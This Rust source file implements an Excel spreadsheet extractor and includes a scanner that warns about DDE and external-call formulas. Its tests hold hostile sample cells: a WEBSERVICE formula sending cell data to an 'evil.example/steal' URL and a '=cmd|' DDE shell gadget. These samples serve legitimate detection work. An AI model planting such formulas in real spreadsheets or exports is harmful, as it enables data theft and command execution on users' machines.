//! Excel spreadsheet extractor.

use crate::Result;
use crate::core::config::ExtractionConfig;
use crate::extractors::SyncExtractor;
use crate::extractors::security::SecurityBudget;
use crate::plugins::{DocumentExtractor, Plugin};
use crate::types::internal::InternalDocument;
use crate::types::internal_builder::InternalDocumentBuilder;
use crate::types::page::PageContent;
use crate::types::tables::Table;
use crate::types::{ExcelMetadata, Metadata, ProcessingWarning};
use ahash::AHashMap;
use async_trait::async_trait;
use std::borrow::Cow;
use std::path::Path;
use std::sync::Arc;

/// DDE and external-call formula patterns that should surface as warnings.
///
/// Calamine resolves most formulas to their cached result value, so the raw
/// `=DDE(...)` string rarely appears in `Data::String` cells. However, some
/// tools store the formula string directly (e.g. when no cached value
/// exists), and calamine emits it verbatim. The patterns below catch the
/// known injection-vector forms. Matching is case-insensitive and anchored
/// to the start of the cell value to avoid false positives on plain text.
///
/// Patterns:
/// - `=DDE(` — Dynamic Data Exchange
/// - `=WEBSERVICE(` — HTTP fetch from external URL
/// - `=HYPERLINK(` — clickable URL (not execution, but disclosure risk)
/// - `=cmd|` — classic CSV/OOXML RCE gadget via DDE with cmd shell
static DDE_PATTERN: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();

fn dde_pattern() -> &'static regex::Regex {
    DDE_PATTERN.get_or_init(|| regex::Regex::new(r"(?i)^=(DDE\(|WEBSERVICE\(|HYPERLINK\(|cmd\|)").unwrap())
}

/// Classify the formula kind from a matching cell value for the warning message.
fn classify_formula(cell: &str) -> &'static str {
    let upper = cell.to_ascii_uppercase();
    if upper.starts_with("=DDE(") {
        "DDE"
    } else if upper.starts_with("=WEBSERVICE(") {
        "WEBSERVICE"
    } else if upper.starts_with("=HYPERLINK(") {
        "HYPERLINK"
    } else {
        "ExternalCall"
    }
}

/// Scan all cells in a workbook for DDE / external-call formula strings.
///
/// Returns one `ProcessingWarning` per matching cell (capped at 100 to avoid
/// flooding the warnings list on adversarial documents). The warning carries
/// the sheet name, zero-based row/col coordinates, and the classified formula
/// kind so downstream consumers can triage.
fn scan_for_dde_warnings(workbook: &crate::types::ExcelWorkbook) -> Vec<ProcessingWarning> {
    const MAX_DDE_WARNINGS: usize = 100;
    let pattern = dde_pattern();
    let mut warnings = Vec::new();

    'outer: for sheet in &workbook.sheets {
        if let Some(ref cells) = sheet.table_cells {
            for (row_idx, row) in cells.iter().enumerate() {
                for (col_idx, cell) in row.iter().enumerate() {
                    if !cell.is_empty() && pattern.is_match(cell) {
                        let kind = classify_formula(cell);
                        warnings.push(ProcessingWarning {
                            source: Cow::Borrowed("excel_dde_scan"),
                            message: Cow::Owned(format!(
                                "Cell [{sheet}!R{row}C{col}] contains \
                                 a {kind} formula that may reference external resources",
                                sheet = sheet.name,
                                row = row_idx + 1,
                                col = col_idx + 1,
                            )),
                        });
                        if warnings.len() >= MAX_DDE_WARNINGS {
                            break 'outer;
                        }
                    }
                }
            }
        }
    }

    warnings
}

/// Validate an Excel workbook against security limits.
///
/// Iterates sheets and their cells, enforcing `max_table_cells` and
/// `max_content_size` via the provided [`SecurityBudget`].
fn validate_workbook_budget(workbook: &crate::types::ExcelWorkbook, budget: &mut SecurityBudget) -> crate::Result<()> {
    for sheet in &workbook.sheets {
        if let Some(ref cells) = sheet.table_cells {
            let row_count = cells.len();
            let col_count = cells.iter().map(|r| r.len()).max().unwrap_or(0);
            budget.add_cells(row_count.saturating_mul(col_count))?;
            for row in cells {
                for cell in row {
                    budget.account_text(cell.len())?;
                }
            }
        }
    }
    Ok(())
}

/// Excel spreadsheet extractor using calamine.
///
/// Supports: .xlsx, .xlsm, .xlam, .xltm, .xls, .xla, .xlsb, .ods
///
/// # Limitations
///
/// - **Hyperlinks**: calamine (v0.34) does not expose cell hyperlink data in its
///   public API. Excel files may contain hyperlinks via the `HYPERLINK()` formula
///   or via the relationships XML, but neither is accessible through the crate.
///   This would require either a calamine upstream change or manual OOXML parsing.
#[cfg_attr(alef, alef(skip))]
pub struct ExcelExtractor;

impl Default for ExcelExtractor {
    fn default() -> Self {
        Self::new()
    }
}

impl ExcelExtractor {
    pub(crate) fn new() -> Self {
        Self
    }

    /// Escape markdown-significant characters in a sheet name for use in a heading.
    ///
    /// Prevents adversarial or unusual sheet names from producing double headings (e.g.
    /// `## ## Profit`) or broken inline elements (e.g. `[Sales](evil)` rendered as a
    /// link). Escapes: `#`, `>`, `-`, `*`, `+`, `\`, `` ` ``, `_`, `[`, `]`, `<`, `>`.
    /// Leading whitespace is stripped because it is invisible and can confuse renderers.
    ///
    /// Scope: used only for the per-page heading in XLSX/ODS output; does not affect the
    /// stored `sheet_name` field, which always carries the raw name.
    fn escape_sheet_name_for_heading(name: &str) -> String {
        const INLINE_METACHARS: &[char] = &['\\', '`', '*', '_', '[', ']', '<', '>', '!'];

        let name = name.trim_start();
        let mut out = String::with_capacity(name.len() + 8);

        for (i, ch) in name.char_indices() {
            let needs_escape =
                (i == 0 && matches!(ch, '#' | '>' | '-' | '*' | '+' | '~')) || INLINE_METACHARS.contains(&ch);
            if needs_escape {
                out.push('\\');
            }
            out.push(ch);
        }

        out
    }

    /// Build an `InternalDocument` from the workbook.
    ///
    /// Each sheet becomes a table preceded by an H2 heading with the sheet name (when
    /// non-empty). Additionally, `prebuilt_pages` is set to `Some(Vec<PageContent>)` with
    /// one entry per sheet so that `ExtractionResult.pages` is always `Some` for Excel.
    ///
    /// Empty sheets still produce a `PageContent` entry so the page index aligns with the
    /// sheet index. The top-level `content` remains the concatenation of all per-sheet
    /// content, preserving backward compat for callers that do not read `pages`.
    fn build_internal_document(workbook: &crate::types::ExcelWorkbook) -> InternalDocument {
        let mut builder = InternalDocumentBuilder::new("excel");
        let mut pages: Vec<PageContent> = Vec::with_capacity(workbook.sheets.len());

        for (sheet_index, sheet) in workbook.sheets.iter().enumerate() {
            let page_number = (sheet_index + 1) as u32;
            let name_opt: Option<String> = if sheet.name.is_empty() {
                None
            } else {
                Some(sheet.name.clone())
            };

            if let Some(ref cells) = sheet.table_cells
                && !cells.is_empty()
            {
                if !sheet.name.is_empty() {
                    builder.push_heading(2, &sheet.name, None, None);
                }
                builder.push_table_from_cells(cells, Some(page_number), None);

                // Build per-sheet content: heading (when named) + markdown table.
                // Sheet name is escaped so markdown-significant characters in the name
                // don't produce double headings or broken inline elements.
                let page_content = if sheet.name.is_empty() {
                    sheet.markdown.clone()
                } else {
                    format!(
                        "## {}\n\n{}",
                        Self::escape_sheet_name_for_heading(&sheet.name),
                        sheet.markdown
                    )
                };

                // Wrap the sheet table in Arc for zero-copy sharing.
                let arc_table = Arc::new(Table {
                    cells: cells.clone(),
                    markdown: sheet.markdown.clone(),
                    page_number,
                    bounding_box: None,
                });

                pages.push(PageContent {
                    page_number,
                    content: page_content,
                    tables: vec![arc_table],
                    image_indices: Vec::new(),
                    hierarchy: None,
                    is_blank: Some(false),
                    layout_regions: None,
                    speaker_notes: None,
                    section_name: None,
                    sheet_name: name_opt,
                });
            } else {
                // Empty sheet: emit a PageContent so page index == sheet index.
                // Content is always "## <name>\n\n" (or empty string) so that
                // concatenating per-page content never mashes two headings together.
                let content = match name_opt.as_deref() {
                    Some(n) => format!("## {}\n\n", Self::escape_sheet_name_for_heading(n)),
                    None => String::new(),
                };

                pages.push(PageContent {
                    page_number,
                    content,
                    tables: Vec::new(),
                    image_indices: Vec::new(),
                    hierarchy: None,
                    is_blank: Some(true),
                    layout_regions: None,
                    speaker_notes: None,
                    section_name: None,
                    sheet_name: name_opt,
                });
            }
        }

        let mut doc = builder.build();
        doc.prebuilt_pages = Some(pages);
        doc
    }
}

impl Plugin for ExcelExtractor {
    fn name(&self) -> &str {
        "excel-extractor"
    }

    fn version(&self) -> String {
        env!("CARGO_PKG_VERSION").to_string()
    }

    fn initialize(&self) -> Result<()> {
        Ok(())
    }

    fn shutdown(&self) -> Result<()> {
        Ok(())
    }
}

impl ExcelExtractor {
    /// Build an InternalDocument from a workbook with metadata.
    fn workbook_to_internal_document(workbook: &crate::types::ExcelWorkbook) -> InternalDocument {
        let mut doc = Self::build_internal_document(workbook);

        let sheet_names: Vec<String> = workbook.sheets.iter().map(|s| s.name.clone()).collect();
        let sheet_count = workbook.sheets.len() as u32;
        let excel_metadata = ExcelMetadata {
            sheet_count: Some(sheet_count),
            sheet_names: Some(sheet_names),
        };

        let mut additional = AHashMap::new();
        let wb_meta = &workbook.metadata;

        // Map office metadata to standard Metadata fields
        let title = wb_meta.get("title").cloned();
        let subject = wb_meta.get("subject").cloned();
        let created_by = wb_meta.get("created_by").or_else(|| wb_meta.get("creator")).cloned();
        let modified_by = wb_meta.get("modified_by").cloned();
        let created_at = wb_meta.get("created_at").cloned();
        let modified_at = wb_meta.get("modified_at").cloned();
        let authors = created_by.as_ref().map(|a| vec![a.clone()]);
        let keywords = wb_meta.get("keywords").map(|k| {
            k.split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        });
        let language = wb_meta.get("language").cloned();

        // Put remaining metadata into additional map (excluding standard fields)
        for (key, value) in &workbook.metadata {
            match key.as_str() {
                "title" | "subject" | "created_by" | "creator" | "modified_by" | "created_at" | "modified_at"
                | "keywords" | "language" => {}
                _ => {
                    additional.insert(Cow::Owned(key.clone()), serde_json::json!(value));
                }
            }
        }

        doc.metadata = Metadata {
            title,
            subject,
            authors,
            keywords,
            language,
            created_at,
            modified_at,
            created_by,
            modified_by,
            format: Some(crate::types::FormatMetadata::Excel(excel_metadata)),
            additional,
            ..Default::default()
        };

        // Transfer revision headers extracted from xl/revisions/revisionHeaders.xml.
        doc.revisions = workbook.revisions.clone();

        // Scan for DDE / external-call formulas and attach any warnings found.
        for warning in scan_for_dde_warnings(workbook) {
            doc.processing_warnings.push(warning);
        }

        doc
    }
}

impl SyncExtractor for ExcelExtractor {
    fn extract_sync(&self, content: &[u8], mime_type: &str, config: &ExtractionConfig) -> Result<InternalDocument> {
        let _span = tracing::debug_span!("extract_excel", element_count = tracing::field::Empty,).entered();

        let extension = match mime_type {
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" => ".xlsx",
            "application/vnd.ms-excel.sheet.macroEnabled.12" => ".xlsm",
            "application/vnd.ms-excel.addin.macroEnabled.12" => ".xlam",
            "application/vnd.ms-excel.template.macroEnabled.12" => ".xltm",
            "application/vnd.ms-excel" => ".xls",
            "application/vnd.ms-excel.addin.macroEnabled" => ".xla",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12" => ".xlsb",
            "application/vnd.oasis.opendocument.spreadsheet" => ".ods",
            _ => ".xlsx",
        };

        let workbook = crate::extraction::excel::read_excel_bytes(content, extension)?;
        let mut budget = SecurityBudget::from_config(config);
        validate_workbook_budget(&workbook, &mut budget)?;
        let mut doc = Self::workbook_to_internal_document(&workbook);
        doc.mime_type = mime_type.to_string();
        Ok(doc)
    }
}

#[cfg_attr(not(target_arch = "wasm32"), async_trait)]
#[cfg_attr(target_arch = "wasm32", async_trait(?Send))]
impl DocumentExtractor for ExcelExtractor {
    #[cfg_attr(feature = "otel", tracing::instrument(
        skip(self, content, config),
        fields(
            extractor.name = self.name(),
            content.size_bytes = content.len(),
        )
    ))]
    async fn extract_bytes(
        &self,
        content: &[u8],
        mime_type: &str,
        config: &ExtractionConfig,
    ) -> Result<InternalDocument> {
        let extension = match mime_type {
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" => ".xlsx",
            "application/vnd.ms-excel.sheet.macroEnabled.12" => ".xlsm",
            "application/vnd.ms-excel.addin.macroEnabled.12" => ".xlam",
            "application/vnd.ms-excel.template.macroEnabled.12" => ".xltm",
            "application/vnd.ms-excel" => ".xls",
            "application/vnd.ms-excel.addin.macroEnabled" => ".xla",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12" => ".xlsb",
            "application/vnd.oasis.opendocument.spreadsheet" => ".ods",
            _ => ".xlsx",
        };

        let workbook = {
            #[cfg(feature = "tokio-runtime")]
            {
                if crate::core::batch_mode::is_batch_mode() {
                    if config.cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                        return Err(crate::error::XbergError::Cancelled);
                    }
                    let content_owned = content.to_vec();
                    let extension_owned = extension.to_string();
                    let span = tracing::Span::current();
                    tokio::task::spawn_blocking(move || {
                        let _guard = span.entered();
                        crate::extraction::excel::read_excel_bytes(&content_owned, &extension_owned)
                    })
                    .await
                    .map_err(|e| crate::error::XbergError::parsing(format!("Excel extraction task failed: {}", e)))??
                } else {
                    crate::extraction::excel::read_excel_bytes(content, extension)?
                }
            }
            #[cfg(not(feature = "tokio-runtime"))]
            {
                if config.cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                    return Err(crate::error::XbergError::Cancelled);
                }
                crate::extraction::excel::read_excel_bytes(content, extension)?
            }
        };

        let mut budget = SecurityBudget::from_config(config);
        validate_workbook_budget(&workbook, &mut budget)?;
        let mut doc = Self::workbook_to_internal_document(&workbook);
        doc.mime_type = mime_type.to_string();
        Ok(doc)
    }

    #[cfg_attr(feature = "otel", tracing::instrument(
        skip(self, path, _config),
        fields(
            extractor.name = self.name(),
        )
    ))]
    async fn extract_file(&self, path: &Path, mime_type: &str, _config: &ExtractionConfig) -> Result<InternalDocument> {
        let path_str = path
            .to_str()
            .ok_or_else(|| crate::XbergError::validation("Invalid file path".to_string()))?;

        let workbook = crate::extraction::excel::read_excel_file(path_str)?;
        let mut doc = Self::workbook_to_internal_document(&workbook);
        doc.mime_type = mime_type.to_string();
        Ok(doc)
    }

    fn supported_mime_types(&self) -> &[&str] {
        &[
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/vnd.ms-excel.sheet.macroEnabled.12",
            "application/vnd.ms-excel.addin.macroEnabled.12",
            "application/vnd.ms-excel.template.macroEnabled.12",
            "application/vnd.ms-excel",
            "application/vnd.ms-excel.addin.macroEnabled",
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
            "application/vnd.oasis.opendocument.spreadsheet",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.template",
        ]
    }

    fn priority(&self) -> i32 {
        50
    }

    fn as_sync_extractor(&self) -> Option<&dyn SyncExtractor> {
        Some(self)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{ExcelSheet, ExcelWorkbook};
    use std::collections::HashMap;

    fn make_sheet(name: &str, cells: Option<Vec<Vec<String>>>) -> ExcelSheet {
        let (markdown, row_count, col_count, cell_count) = match cells.as_ref() {
            Some(c) if !c.is_empty() => {
                let rows = c.len();
                let cols = c.iter().map(|r| r.len()).max().unwrap_or(0);
                let count = c.iter().flat_map(|r| r.iter()).filter(|s| !s.is_empty()).count();
                // Build a minimal markdown table for test assertions
                let mut md = String::new();
                for (i, row) in c.iter().enumerate() {
                    md.push('|');
                    for cell in row {
                        md.push(' ');
                        md.push_str(cell);
                        md.push_str(" |");
                    }
                    md.push('\n');
                    if i == 0 && c.len() > 1 {
                        md.push('|');
                        for _ in row {
                            md.push_str(" --- |");
                        }
                        md.push('\n');
                    }
                }
                (md, rows, cols, count)
            }
            _ => (String::new(), 0, 0, 0),
        };
        ExcelSheet {
            name: name.to_string(),
            markdown,
            row_count,
            col_count,
            cell_count,
            table_cells: cells,
        }
    }

    fn make_workbook(sheets: Vec<ExcelSheet>) -> ExcelWorkbook {
        ExcelWorkbook {
            sheets,
            metadata: HashMap::new(),
            revisions: None,
        }
    }

    #[test]
    fn test_excel_extractor_plugin_interface() {
        let extractor = ExcelExtractor::new();
        assert_eq!(extractor.name(), "excel-extractor");
        assert!(extractor.initialize().is_ok());
        assert!(extractor.shutdown().is_ok());
    }

    #[test]
    fn test_excel_extractor_supported_mime_types() {
        let extractor = ExcelExtractor::new();
        let mime_types = extractor.supported_mime_types();
        assert_eq!(mime_types.len(), 9);
        assert!(mime_types.contains(&"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"));
        assert!(mime_types.contains(&"application/vnd.ms-excel"));
    }

    #[test]
    fn test_prebuilt_pages_always_some() {
        // Even an empty workbook sets prebuilt_pages to Some(vec![]) so callers
        // can rely on .is_some() to detect that this format supports paging.
        let workbook = make_workbook(vec![]);
        let doc = ExcelExtractor::build_internal_document(&workbook);
        assert!(doc.prebuilt_pages.is_some());
        assert_eq!(doc.prebuilt_pages.unwrap().len(), 0);
    }

    #[test]
    fn test_single_sheet_produces_one_page() {
        let cells = vec![
            vec!["Name".to_string(), "Value".to_string()],
            vec!["A".to_string(), "1".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("Sheet1", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);
        assert_eq!(pages[0].page_number, 1);
        // sheet_name carries the raw sheet name; section_name is PPTX-only
        assert_eq!(pages[0].sheet_name.as_deref(), Some("Sheet1"));
        assert_eq!(pages[0].section_name, None);
        assert!(pages[0].content.contains("Sheet1"));
        assert_eq!(pages[0].tables.len(), 1);
        assert_eq!(pages[0].is_blank, Some(false));
    }

    #[test]
    fn test_single_sheet_content_matches_flat_content() {
        // The concatenation of per-sheet page content should equal what the flat
        // extraction produces (heading text + table rows visible in elements).
        let cells = vec![
            vec!["Col1".to_string(), "Col2".to_string()],
            vec!["r1".to_string(), "r2".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("Data", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);
        // Page content must start with the heading
        assert!(pages[0].content.starts_with("## Data"));
        // Page content must include the table markdown
        assert!(pages[0].content.contains("Col1"));
        assert!(pages[0].content.contains("r1"));
    }

    #[test]
    fn test_multi_sheet_workbook_produces_one_page_per_sheet() {
        let sheet1_cells = vec![
            vec!["A".to_string(), "B".to_string()],
            vec!["1".to_string(), "2".to_string()],
        ];
        let sheet2_cells = vec![vec!["X".to_string()], vec!["99".to_string()]];
        let sheet3_cells = vec![vec!["P".to_string(), "Q".to_string(), "R".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("First", Some(sheet1_cells)),
            make_sheet("Second", Some(sheet2_cells)),
            make_sheet("Third", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 3);

        // Page numbers are 1-indexed and match sheet order
        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[2].page_number, 3);

        // sheet_name carries the raw sheet name; section_name is PPTX-only and must be None
        assert_eq!(pages[0].sheet_name.as_deref(), Some("First"));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("Second"));
        assert_eq!(pages[2].sheet_name.as_deref(), Some("Third"));
        assert_eq!(pages[0].section_name, None);
        assert_eq!(pages[1].section_name, None);
        assert_eq!(pages[2].section_name, None);

        // Each page's content is only that sheet's markdown (not other sheets)
        assert!(pages[0].content.contains("First"));
        assert!(!pages[0].content.contains("Second"));
        assert!(pages[1].content.contains("Second"));
        assert!(!pages[1].content.contains("First"));
        assert!(pages[2].content.contains("Third"));

        // Each page has exactly one table
        assert_eq!(pages[0].tables.len(), 1);
        assert_eq!(pages[1].tables.len(), 1);
        assert_eq!(pages[2].tables.len(), 1);

        // Tables carry the right cells
        assert_eq!(pages[0].tables[0].cells[0][0], "A");
        assert_eq!(pages[1].tables[0].cells[0][0], "X");
        assert_eq!(pages[2].tables[0].cells[0][0], "P");
    }

    #[test]
    fn test_top_level_tables_populated_for_multi_sheet_workbook() {
        // ExtractionResult.tables (top-level) must be populated after XLSX extraction
        // and the count must equal the number of sheets with data. This is the primary
        // backward-compat surface for callers that do not read .pages.
        let sheet1_cells = vec![
            vec!["H1".to_string(), "H2".to_string()],
            vec!["r1c1".to_string(), "r1c2".to_string()],
        ];
        let sheet2_cells = vec![vec!["X".to_string()], vec!["99".to_string()]];
        let sheet3_cells = vec![vec!["P".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("Alpha", Some(sheet1_cells)),
            make_sheet("Beta", Some(sheet2_cells)),
            make_sheet("Gamma", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        // Top-level tables come from the builder's push_table_from_cells calls
        assert_eq!(
            doc.tables.len(),
            3,
            "top-level tables count must equal number of sheets with data"
        );

        // Table page numbers must align with sheet order (1-indexed)
        assert_eq!(doc.tables[0].page_number, 1);
        assert_eq!(doc.tables[1].page_number, 2);
        assert_eq!(doc.tables[2].page_number, 3);

        // Spot-check cell content to confirm identity
        assert_eq!(doc.tables[0].cells[0][0], "H1");
        assert_eq!(doc.tables[1].cells[0][0], "X");
        assert_eq!(doc.tables[2].cells[0][0], "P");
    }

    #[test]
    fn test_empty_sheet_in_middle_produces_page_at_correct_index() {
        // An empty sheet must still emit a PageContent so page index == sheet index.
        let sheet1_cells = vec![vec!["A".to_string()]];
        let sheet3_cells = vec![vec!["C".to_string()]];
        let workbook = make_workbook(vec![
            make_sheet("First", Some(sheet1_cells)),
            make_sheet("Empty", None), // empty — no table_cells
            make_sheet("Third", Some(sheet3_cells)),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 3);

        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[2].page_number, 3);

        // Empty sheet has no tables and is marked blank
        assert_eq!(pages[1].tables.len(), 0);
        assert_eq!(pages[1].is_blank, Some(true));
        // sheet_name is still set; section_name is PPTX-only
        assert_eq!(pages[1].sheet_name.as_deref(), Some("Empty"));
        assert_eq!(pages[1].section_name, None);
        // Empty-sheet content must end with "\n\n" so per-page concatenation
        // produces a blank line between two adjacent headings.
        assert!(
            pages[1].content.ends_with("\n\n"),
            "empty-sheet content must end with two newlines, got: {:?}",
            pages[1].content
        );

        // Non-empty sheets are not blank
        assert_eq!(pages[0].is_blank, Some(false));
        assert_eq!(pages[2].is_blank, Some(false));
    }

    #[test]
    fn test_empty_sheet_cells_vec_produces_page_at_correct_index() {
        // table_cells = Some(vec![]) (present but empty) is treated the same as None.
        let workbook = make_workbook(vec![
            make_sheet("HasData", Some(vec![vec!["x".to_string()]])),
            make_sheet("EmptyCells", Some(vec![])),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 2);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[1].tables.len(), 0);
        assert_eq!(pages[1].is_blank, Some(true));
        assert!(pages[1].content.ends_with("\n\n"), "empty sheet must end with \\n\\n");
    }

    #[test]
    fn test_sheet_order_preserved() {
        // Natural workbook sheet order must be reflected in page order.
        let workbook = make_workbook(vec![
            make_sheet("Z", Some(vec![vec!["z".to_string()]])),
            make_sheet("A", Some(vec![vec!["a".to_string()]])),
            make_sheet("M", Some(vec![vec!["m".to_string()]])),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages[0].sheet_name.as_deref(), Some("Z"));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("A"));
        assert_eq!(pages[2].sheet_name.as_deref(), Some("M"));
    }

    // ---- DDE / external-call formula scanning tests --------------------------

    fn make_dde_workbook(cell_value: &str) -> ExcelWorkbook {
        // Single sheet "Sheet1" with the given cell at R1C1.
        make_workbook(vec![make_sheet("Sheet1", Some(vec![vec![cell_value.to_string()]]))])
    }

    #[test]
    fn test_dde_formula_emits_warning() {
        let workbook = make_dde_workbook("=DDE(\"winword\",\"c:\\test.doc\",\"All\")");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1, "exactly one DDE warning expected");
        assert!(
            warnings[0].message.contains("DDE"),
            "warning must name the formula kind: {}",
            warnings[0].message
        );
        assert!(
            warnings[0].message.contains("R1C1"),
            "warning must include cell coordinate: {}",
            warnings[0].message
        );
        assert_eq!(warnings[0].source, "excel_dde_scan");
    }

    #[test]
    fn test_webservice_formula_emits_warning() {
        let workbook = make_dde_workbook("=WEBSERVICE(\"https://evil.example/steal?data=\"&A1)");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("WEBSERVICE"), "{}", warnings[0].message);
    }

    #[test]
    fn test_hyperlink_formula_emits_warning() {
        let workbook = make_dde_workbook("=HYPERLINK(\"https://evil.example\",\"click me\")");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("HYPERLINK"), "{}", warnings[0].message);
    }

    #[test]
    fn test_cmd_pipe_formula_emits_warning() {
        // Classic CSV injection via DDE cmd shell gadget.
        let workbook = make_dde_workbook("=cmd|' /c calc'!A0");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("ExternalCall"), "{}", warnings[0].message);
    }

    #[test]
    fn test_benign_formula_string_no_warning() {
        // Calamine sometimes emits bare formula text for SUM/AVERAGE etc.
        // These must not produce warnings.
        for safe in &["=SUM(A1:A2)", "=AVERAGE(B:B)", "hello world", "42", ""] {
            let workbook = make_dde_workbook(safe);
            let warnings = scan_for_dde_warnings(&workbook);
            assert!(
                warnings.is_empty(),
                "unexpected DDE warning for safe cell {:?}: {:?}",
                safe,
                warnings
            );
        }
    }

    #[test]
    fn test_dde_warning_cap_at_100() {
        // Build a single sheet with 200 DDE cells and verify warnings are capped.
        let cells: Vec<Vec<String>> = (0..200)
            .map(|i| vec![format!("=DDE(\"app\",\"topic\",\"item{}\")", i)])
            .collect();
        let workbook = make_workbook(vec![make_sheet("Big", Some(cells))]);
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(
            warnings.len(),
            100,
            "DDE warnings must be capped at 100, got {}",
            warnings.len()
        );
    }

    #[test]
    fn test_dde_formula_case_insensitive() {
        // Pattern must fire regardless of case.
        for variant in &[
            "=dde(\"app\",\"t\",\"i\")",
            "=DdE(\"a\",\"b\",\"c\")",
            "=webservice(\"x\")",
        ] {
            let workbook = make_dde_workbook(variant);
            let warnings = scan_for_dde_warnings(&workbook);
            assert_eq!(warnings.len(), 1, "case-insensitive match failed for {:?}", variant);
        }
    }

    #[test]
    fn test_workbook_to_internal_document_includes_dde_warnings() {
        // Verify the integration: workbook_to_internal_document must attach DDE warnings.
        let workbook = make_workbook(vec![make_sheet(
            "Injection",
            Some(vec![
                vec!["=DDE(\"app\",\"topic\",\"data\")".to_string()],
                vec!["normal".to_string()],
            ]),
        )]);
        let doc = ExcelExtractor::workbook_to_internal_document(&workbook);
        let dde_warnings: Vec<_> = doc
            .processing_warnings
            .iter()
            .filter(|w| w.source == "excel_dde_scan")
            .collect();
        assert_eq!(dde_warnings.len(), 1, "one DDE warning expected in InternalDocument");
        assert!(dde_warnings[0].message.contains("DDE"), "{}", dde_warnings[0].message);
    }

    #[test]
    fn test_sheet_name_markdown_escape_in_heading() {
        // A sheet named "## Profit (2025) [Q1]" must not produce a double heading
        // ("## ## Profit...") and must not render as a markdown link.
        let cells = vec![
            vec!["Revenue".to_string(), "Cost".to_string()],
            vec!["100".to_string(), "80".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("## Profit (2025) [Q1]", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook);

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);

        // The raw sheet name is stored unescaped in sheet_name
        assert_eq!(pages[0].sheet_name.as_deref(), Some("## Profit (2025) [Q1]"));

        // The heading in content must not start with "## ##" (double heading)
        assert!(
            !pages[0].content.starts_with("## ##"),
            "double heading detected: {:?}",
            &pages[0].content[..pages[0].content.find('\n').unwrap_or(pages[0].content.len())]
        );
        // The heading line must not contain an unescaped "[Q1]" that renders as a link
        let first_line = pages[0].content.lines().next().unwrap_or("");
        // Unescaped "[Q1]" followed by "(..." is what creates a link; after escaping
        // the "[" is preceded by a backslash so the pattern "[Q1]" → "\[Q1\]"
        assert!(
            !first_line.contains("[Q1]") || first_line.contains("\\["),
            "unescaped markdown link syntax in heading: {:?}",
            first_line
        );
        // Content must still contain the heading marker and the word "Profit"
        assert!(pages[0].content.starts_with("## "), "content must start with H2 marker");
        assert!(pages[0].content.contains("Profit"));
    }
}
